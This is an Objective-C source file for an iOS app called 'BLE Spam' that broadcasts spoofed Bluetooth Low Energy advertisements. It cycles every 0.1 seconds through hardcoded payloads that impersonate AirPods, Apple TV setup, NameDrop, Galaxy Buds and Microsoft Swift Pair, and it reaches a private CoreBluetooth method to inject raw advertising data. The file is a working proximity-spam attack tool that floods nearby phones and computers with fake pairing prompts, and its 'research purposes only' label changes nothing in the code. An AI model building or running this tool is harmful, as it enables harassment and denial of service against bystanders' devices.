#import <UIKit/UIKit.h>
#import <CoreBluetooth/CoreBluetooth.h>
#import <objc/message.h>

static NSArray *blePayloads(void) {
    return @[
        [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x07,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
        [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x13,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
        [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x0A,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
        [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x04,0x05,0x03,0xC0,0x01,0x00,0x00} length:9],
        [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x05,0x12,0x01,0x00,0x07,0x00} length:8],
        [NSData dataWithBytes:(uint8_t[]){0xE0,0x00,0x01,0x2B,0x41,0x02,0x00,0x00} length:8],
        [NSData dataWithBytes:(uint8_t[]){0x06,0x00,0x03,0x00,0x80,0x00} length:6],
    ];
}

static NSArray *bleNames(void) {
    return @[
        @"AirPods Pro 2",
        @"AirPods 3rd Gen",
        @"AirPods Max",
        @"Apple TV Setup",
        @"NameDrop",
        @"Galaxy Buds Pro",
        @"MS Swift Pair"
    ];
}

// ── Private BLE advertise via NSInvocation ────────────────────────────────────

static void advertise(CBPeripheralManager *p, NSData *d) {
    NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
    SEL s = NSSelectorFromString(
        @"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:"
    );
    if ([p respondsToSelector:s]) {
        NSMethodSignature *sig = [p methodSignatureForSelector:s];
        NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
        inv.target = p;
        inv.selector = s;
        [inv setArgument:&ad atIndex:2];
        uint8_t mask = 0x00, flags = 0x06;
        [inv setArgument:&mask  atIndex:3];
        [inv setArgument:&flags atIndex:4];
        id handler = nil;
        [inv setArgument:&handler atIndex:5];
        [inv invoke];
    } else {
        [p startAdvertising:ad];
    }
}

// ── SpamVC ────────────────────────────────────────────────────────────────────

@interface SpamVC : UIViewController <CBPeripheralManagerDelegate>
@property CBPeripheralManager *pm;
@property NSTimer *timer;
@property NSUInteger idx, count;
@property UILabel *countLbl, *nameLbl, *statusDot;
@property UIButton *btn;
@end

@implementation SpamVC

- (void)viewDidLoad {
    [super viewDidLoad];

    // Background
    self.view.backgroundColor = [UIColor colorWithRed:0.05 green:0.05 blue:0.12 alpha:1];

    // Gradient orb (decorative)
    UIView *orb = [[UIView alloc] initWithFrame:CGRectMake(-80, -80, 300, 300)];
    orb.backgroundColor = [UIColor colorWithRed:0.23 green:0.35 blue:0.95 alpha:0.18];
    orb.layer.cornerRadius = 150;
    [self.view addSubview:orb];

    // Title
    UILabel *title = [UILabel new];
    title.text = @"📡  BLE Spam";
    title.font = [UIFont boldSystemFontOfSize:34];
    title.textColor = UIColor.whiteColor;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    // Subtitle
    UILabel *sub = [UILabel new];
    sub.text = @"Proximity Payload Broadcaster";
    sub.font = [UIFont systemFontOfSize:13];
    sub.textColor = [UIColor colorWithWhite:0.45 alpha:1];
    sub.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:sub];

    // Status dot + label
    self.statusDot = [UILabel new];
    self.statusDot.text = @"● Ready";
    self.statusDot.font = [UIFont systemFontOfSize:14 weight:UIFontWeightSemibold];
    self.statusDot.textColor = [UIColor colorWithWhite:0.5 alpha:1];
    self.statusDot.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusDot];

    // Current payload name
    self.nameLbl = [UILabel new];
    self.nameLbl.text = @"";
    self.nameLbl.font = [UIFont systemFontOfSize:13 weight:UIFontWeightMedium];
    self.nameLbl.textColor = [UIColor colorWithRed:0.5 green:0.8 blue:1.0 alpha:1];
    self.nameLbl.translatesAutoresizingMaskIntoConstraints = NO;
    self.nameLbl.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.nameLbl];

    // Packet count
    self.countLbl = [UILabel new];
    self.countLbl.text = @"Packets: 0";
    self.countLbl.font = [UIFont monospacedSystemFontOfSize:15 weight:UIFontWeightRegular];
    self.countLbl.textColor = [UIColor colorWithWhite:0.4 alpha:1];
    self.countLbl.translatesAutoresizingMaskIntoConstraints = NO;
    self.countLbl.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.countLbl];

    // Start/Stop button
    self.btn = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.btn setTitle:@"▶  START" forState:UIControlStateNormal];
    self.btn.titleLabel.font = [UIFont boldSystemFontOfSize:20];
    self.btn.tintColor = UIColor.whiteColor;
    self.btn.backgroundColor = [UIColor colorWithRed:0.20 green:0.45 blue:0.95 alpha:1];
    self.btn.layer.cornerRadius = 28;
    self.btn.layer.shadowColor  = [UIColor colorWithRed:0.20 green:0.45 blue:0.95 alpha:1].CGColor;
    self.btn.layer.shadowOffset = CGSizeMake(0, 6);
    self.btn.layer.shadowOpacity = 0.5;
    self.btn.layer.shadowRadius  = 12;
    self.btn.translatesAutoresizingMaskIntoConstraints = NO;
    [self.btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.btn];

    // Warning label
    UILabel *warn = [UILabel new];
    warn.text = @"⚠️  For research purposes only";
    warn.font = [UIFont systemFontOfSize:11];
    warn.textColor = [UIColor colorWithWhite:0.3 alpha:1];
    warn.translatesAutoresizingMaskIntoConstraints = NO;
    warn.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:warn];

    // Layout
    [NSLayoutConstraint activateConstraints:@[
        [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [title.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:50],

        [sub.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [sub.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:6],

        [self.statusDot.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.statusDot.topAnchor constraintEqualToAnchor:sub.bottomAnchor constant:40],

        [self.nameLbl.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.nameLbl.topAnchor constraintEqualToAnchor:self.statusDot.bottomAnchor constant:12],
        [self.nameLbl.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [self.nameLbl.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],

        [self.countLbl.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.countLbl.topAnchor constraintEqualToAnchor:self.nameLbl.bottomAnchor constant:8],

        [self.btn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.btn.topAnchor constraintEqualToAnchor:self.countLbl.bottomAnchor constant:50],
        [self.btn.widthAnchor constraintEqualToConstant:220],
        [self.btn.heightAnchor constraintEqualToConstant:56],

        [warn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [warn.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-20],
    ]];
}

- (void)toggle {
    if (self.timer) {
        // Stop
        [self.timer invalidate]; self.timer = nil;
        [self.pm stopAdvertising]; self.pm = nil;

        [self.btn setTitle:@"▶  START" forState:UIControlStateNormal];
        self.btn.backgroundColor = [UIColor colorWithRed:0.20 green:0.45 blue:0.95 alpha:1];
        self.btn.layer.shadowColor = [UIColor colorWithRed:0.20 green:0.45 blue:0.95 alpha:1].CGColor;
        self.statusDot.text = @"● Ready";
        self.statusDot.textColor = [UIColor colorWithWhite:0.5 alpha:1];
        self.nameLbl.text = @"";
    } else {
        // Start
        self.count = 0; self.idx = 0;
        self.pm = [[CBPeripheralManager alloc] initWithDelegate:self
                                                          queue:nil
                                                        options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
        [self.btn setTitle:@"■  STOP" forState:UIControlStateNormal];
        self.btn.backgroundColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:1];
        self.btn.layer.shadowColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:1].CGColor;
        self.statusDot.text = @"● Broadcasting…";
        self.statusDot.textColor = [UIColor colorWithRed:0.3 green:1.0 blue:0.5 alpha:1];
    }

    UIImpactFeedbackGenerator *hap = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleHeavy];
    [hap impactOccurred];
}

- (void)peripheralManagerDidUpdateState:(CBPeripheralManager *)p {
    if (p.state != CBManagerStatePoweredOn) return;

    self.timer = [NSTimer scheduledTimerWithTimeInterval:0.1
                                                 repeats:YES
                                                   block:^(NSTimer *t) {
        NSArray *payloads = blePayloads();
        NSArray *names    = bleNames();
        if (self.idx >= payloads.count) self.idx = 0;

        NSData   *d    = payloads[self.idx];
        NSString *name = names[self.idx];
        self.idx++;

        [p stopAdvertising];
        advertise(p, d);
        self.count++;

        dispatch_async(dispatch_get_main_queue(), ^{
            self.nameLbl.text  = name;
            self.countLbl.text = [NSString stringWithFormat:@"Packets: %lu", (unsigned long)self.count];
        });
    }];
}

- (void)peripheralManagerDidStartAdvertising:(CBPeripheralManager *)p error:(NSError *)e {
    if (e) NSLog(@"[BLESpam] advertise error: %@", e);
}

@end

// ── AppDelegate + main ────────────────────────────────────────────────────────

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [SpamVC new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, @"AppDelegate");
    }
}
